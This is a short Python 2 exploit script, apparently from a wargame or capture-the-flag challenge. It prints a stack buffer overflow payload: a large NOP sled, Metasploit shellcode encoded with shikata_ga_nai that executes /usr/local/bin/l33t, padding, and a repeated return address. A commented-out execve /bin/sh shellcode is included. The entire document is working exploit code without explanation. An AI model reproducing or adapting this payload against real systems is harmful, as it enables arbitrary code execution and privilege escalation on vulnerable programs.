# linux/x86/exec - 82 bytes
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
# PrependSetreuid=false, PrependSetuid=false, 
# PrependSetresgid=false, PrependSetregid=false, 
# PrependSetgid=false, PrependChrootBreak=false, 
# AppendExit=false, CMD=/usr/local/bin/l33t
buf =  ""
buf += "\xbf\x57\x7c\xc3\x50\xda\xd1\xd9\x74\x24\xf4\x5e\x33"
buf += "\xc9\xb1\x0e\x83\xc6\x04\x31\x7e\x11\x03\x7e\x11\xe2"
buf += "\xa2\x16\xc8\x08\xd5\xb5\xa8\xc0\xc8\x5a\xbc\xf6\x7a"
buf += "\xb2\xcd\x90\x7a\xa4\x1e\x03\x13\x5a\xe8\x20\xb1\x4a"
buf += "\xfe\xa6\x35\x8b\xd0\xd3\x46\xf9\x01\x70\xc7\x9e\x3c"
buf += "\xe4\x38\x03\xd6\x9a\x69\xaf\x1b\x50\x01\x2f\x0b\xc5"
buf += "\x60\xce\x7e\x69"

#buf = "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

nop = "\x90"*(65536 - len(buf)-100)

print nop+buf+"A"*100+"\x00\xd0\xfe\xff"*3,
